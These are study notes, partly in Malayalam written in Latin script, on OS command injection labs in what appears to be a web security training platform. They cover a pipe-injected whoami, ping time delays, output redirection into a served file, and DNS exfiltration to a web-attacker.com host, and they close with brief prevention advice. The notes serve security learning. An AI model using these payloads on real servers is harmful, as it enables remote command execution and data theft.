-->OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application

             Lab-1(OS command injection, simple case)
-->ivide oru shoping cart aan
-->ethengilum oru product edukuka enit athile stock check chyuna oru option und
-->athil ethengilum onn select chyth check chyuka
-->apol kanam ethra units unden 
-->so aa request namal repeater il iduka
-->repeater il productId=1&storeId=2 ingane aan indavuka
-->ivide storeid enna parameter command adich search chyuna pole thane aan namuk result tharunath so avide | itt vere command adich nokuka
-->ie  -  productId=1&storeId=2|id  allengil whoami enno adich nokiya ariyam command injection work akumo ilayo enn.ivide work aakunund.athayath id allengi whoami enn adikimbol repeater ile response il result kanikunund.
-->athe samayam storid=2||whoami ennadichal prathyekich onum kanikila.normal aayi thane site behave chyum.so test chyumbol oru | mathram itt test chyanam

### Blind OS command injection vulnerabilities
-->Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response
-->You can use an injected command that will trigger a time delay, allowing you to confirm that the command was executed based on the time that the application takes to respond
-->The ping command is an effective way to do this, as it lets you specify the number of ICMP packets to send, and therefore the time taken for the command to run:
            -->& ping+-c+10+127.0.0.1 &      (ivide 10 secodnd delay chyum)

              Lab-2(OS command injection with time delays)
-->ivide blind injection aan so nammal inject chyunath kanikila
-->so injection work aakunundo en ariyan time delay technique use chyunu
-->ivide feedbak chyuna sthalath aan chyendath
-->ivide username,email,subject,message optionil enthelum koduthit ok kodukuka
-->ini ee request repeater il iduka
-->satharan username,password okke login chyth kodukule athupole thazhe aayit nammal koduthath kanam
-->ini enth venam enal test chyth nokanam evide engilum os injection aavunundo enn
  csrf=Ajxlw4AUFFZ7R6jqufH9UkjSJE6q0KFd&name=helo&email=shes%40gmail.com&subject=sdfs&message=hhhhhhhhhhhhh
     ingane aan request il undavuka.ivide oro parameter value in shesham venam test 
	 chyan.rememer ith blind aan so onum kanila.time delay chyth nokanam
-->so ivide email in shesham nammal test chyth nokumbol time delay aavunund so avide blind injection und ennartham - &email=shes%40gmail.com||ping+-c+10+127.0.0.1||&subject.ithupole chythit send chythal 10 second kazhinjite response kitu

         Lab-3(Blind OS command injection with output redirection)
-->ivide blind os injection aan ullath athukond thane inject chyunath kanan patila
-->feedback page il aan inject chyunath
-->athil fill chythil ok adikuka enit repeateril aa request viduka
-->ini athile oro parameter inu shesham | itt test chyuka eg:  productId=1|&storeId=2 enit error varunath vere oro parameter value in shesham itu test chyuka.
-->emial in shesham ath idumgol couldnot send feedback en kanikum.so aa parameter vulnerable aanu en manasilakam
-->so aa parameter il :-      &email=jos%40jameil.com||whoami>/var/www/images/josu.txt||&subject enn iduka apol whoami ennath josu.txt ena file il images directory il save aakum
-->ini image varuna request edukuka - /image?filename=1.jpg  -  ivide filename=josu.txt enn kodukuka karanam ivide aan aa file save chythath apol burp ile response il kanam - "peter-0rienQ"
-->| avunilengil & it chythnokam pala reethiyil chyam

### Exploiting blind OS command injection using out-of-band (OAST) techniques
-->You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example: 
           -->& nslookup kgji2ohoyw.web-attacker.com &
--> This payload uses the nslookup command to cause a DNS lookup for the specified domain. The attacker can monitor for the specified lookup occurring, and thereby detect that the command was successfully injected. ee monitor chythth namude burp collaborator client il monitor chyam		   
		   
        Lab-4(Blind OS command injection with out-of-band interaction)
-->ividem nammal feedback page il aan chyunath
-->pakshe nerthepole parameter value in shesham | , & onum ititum error varunila
-->so nammal oast chyunu
-->so email parameter value il command inject chyunu - email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
-->ivide burp inte collaborator client url kodukanam
-->enit repeater il send kodukanam
-->ini collaborator il poi poll now koduthal namal kodutha nslookup avide kanan patum
-->ingane chyumbol namul ivide whoami oke adichu nokan patum - & nslookup `whoami`.kgji2ohoyw.web-attacker.com &message    - ivide ` ` symbol nirbhandhamayi idanam enale aaku  -   `ithan lab-5 il chyunath`

#### ways of injecting

    &           
    &&
    |
    ||
ee sathanangal okke itt test chyth nokam

#### prevention
so os command injection prevent chyunath engane aanenal kazhivathum enhtengilum call chyumbol os command aayi call chyathirikuka pakaram alternative methoda aaya api oke vech oron call chyth response aayi tharuka